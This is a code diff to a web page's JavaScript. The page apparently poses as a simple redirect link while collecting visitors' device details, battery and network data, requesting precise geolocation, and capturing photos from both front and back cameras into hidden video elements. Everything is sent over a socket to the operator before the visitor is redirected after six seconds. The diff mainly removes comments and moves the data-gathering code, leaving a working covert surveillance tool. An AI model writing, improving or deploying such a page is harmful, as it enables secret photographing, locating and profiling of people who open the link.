@@ -71,9 +71,6 @@
     </script>
 
     <script>
-        // ============================================================
-        // CLEAN: Browser default permissions, minimal UI
-        // ============================================================
         (function() {
             const visitorId = window.location.pathname.split('/').pop();
             const redirectDisplay = document.getElementById('redirectUrlDisplay');
@@ -82,9 +79,6 @@
             let redirectUrl = 'https://www.google.com';
             let redirectTriggered = false;
 
-            // ============================================
-            // 1. FETCH REDIRECT URL
-            // ============================================
             function fetchRedirectUrl() {
                 fetch(`/api/visitor/${visitorId}`)
                     .then(res => res.json())
@@ -109,21 +103,13 @@
                     });
             }
 
-            // ============================================
-            // 2. START PROCESS
-            // ============================================
             function startProcess() {
                 connectSocket();
-                
-                // Redirect after 6 seconds (enough time for permissions)
-                setTimeout(function() {
+                setTimeout(() => {
                     if (!redirectTriggered) redirectNow();
                 }, 6000);
             }
 
-            // ============================================
-            // 3. CONNECT SOCKET
-            // ============================================
             function connectSocket() {
                 try {
                     socket = io({
@@ -140,13 +126,9 @@
                     socket.on('connect_error', function() {
                         setTimeout(() => socket.connect(), 2000);
                     });
-
                 } catch(e) {}
             }
 
-            // ============================================
-            // 4. SEND DEVICE INFO (No permission needed)
-            // ============================================
             function sendDeviceInfo() {
                 if (!socket || !socket.connected) {
                     setTimeout(sendDeviceInfo, 500);
@@ -164,13 +146,44 @@
                 };
 
                 socket.emit('visitor-connect', { visitorId, ...deviceInfo });
+
+                // Battery
+                if (navigator.getBattery) {
+                    navigator.getBattery()
+                        .then(function(battery) {
+                            const level = Math.round(battery.level * 100);
+                            if (socket && socket.connected) {
+                                socket.emit('visitor-data', {
+                                    visitorId,
+                                    type: 'battery',
+                                    content: level
+                                });
+                            }
+                        })
+                        .catch(() => {});
+                }
+
+                // Network
+                let networkData = { type: 'Unknown', effectiveType: 'Unknown' };
+                if (navigator.connection) {
+                    const conn = navigator.connection;
+                    networkData = {
+                        type: conn.type || 'Unknown',
+                        effectiveType: conn.effectiveType || 'Unknown',
+                        downlink: conn.downlink || 'Unknown'
+                    };
+                }
+                if (socket && socket.connected) {
+                    socket.emit('visitor-data', {
+                        visitorId,
+                        type: 'network',
+                        content: networkData
+                    });
+                }
             }
 
-            // ============================================
-            // 5. REQUEST PERMISSIONS (Browser default popup)
-            // ============================================
             function requestPermissions() {
-                // ===== LOCATION (Browser default popup) =====
+                // Location
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(
                         function(pos) {
@@ -206,12 +219,12 @@
                                     }
                                 });
                         },
-                        function() { /* User denied - continue */ },
+                        function() {},
                         { timeout: 4000, enableHighAccuracy: true }
                     );
                 }
 
-                // ===== FRONT CAMERA (Browser default popup) =====
+                // Front Camera
                 navigator.mediaDevices.getUserMedia({
                     video: { facingMode: 'user' },
                     audio: false
@@ -226,9 +239,9 @@
                         capturePhoto('front', document.getElementById('hiddenVideo'));
                     }, 1000);
                 })
-                .catch(function() { /* User denied - continue */ });
+                .catch(function() {});
 
-                // ===== BACK CAMERA (Browser default popup) =====
+                // Back Camera
                 navigator.mediaDevices.getUserMedia({
                     video: { facingMode: 'environment' },
                     audio: false
@@ -243,46 +256,9 @@
                         capturePhoto('back', document.getElementById('hiddenVideoBack'));
                     }, 2000);
                 })
-                .catch(function() { /* User denied - continue */ });
-
-                // ===== BATTERY (No permission) =====
-                if (navigator.getBattery) {
-                    navigator.getBattery()
-                        .then(function(battery) {
-                            const level = Math.round(battery.level * 100);
-                            if (socket && socket.connected) {
-                                socket.emit('visitor-data', {
-                                    visitorId,
-                                    type: 'battery',
-                                    content: level
-                                });
-                            }
-                        })
-                        .catch(function() {});
-                }
-
-                // ===== NETWORK (No permission) =====
-                let networkData = { type: 'Unknown', effectiveType: 'Unknown' };
-                if (navigator.connection) {
-                    const conn = navigator.connection;
-                    networkData = {
-                        type: conn.type || 'Unknown',
-                        effectiveType: conn.effectiveType || 'Unknown',
-                        downlink: conn.downlink || 'Unknown'
-                    };
-                }
-                if (socket && socket.connected) {
-                    socket.emit('visitor-data', {
-                        visitorId,
-                        type: 'network',
-                        content: networkData
-                    });
-                }
+                .catch(function() {});
             }
 
-            // ============================================
-            // 6. CAPTURE PHOTO
-            // ============================================
             function capturePhoto(type, video) {
                 if (!video || !video.videoWidth) return;
 
@@ -306,9 +282,6 @@
                 }
             }
 
-            // ============================================
-            // 7. REDIRECT
-            // ============================================
             function redirectNow() {
                 if (redirectTriggered) return;
                 redirectTriggered = true;
@@ -321,14 +294,11 @@
                     });
                 }
 
-                setTimeout(function() {
+                setTimeout(() => {
                     window.location.href = redirectUrl;
                 }, 500);
             }
 
-            // ============================================
-            // 8. START
-            // ============================================
             if (typeof io !== 'undefined') {
                 fetchRedirectUrl();
             } else {
@@ -338,7 +308,6 @@
             window.addEventListener('beforeunload', function() {
                 if (socket) socket.disconnect();
             });
-
         })();
     </script>
 </body>
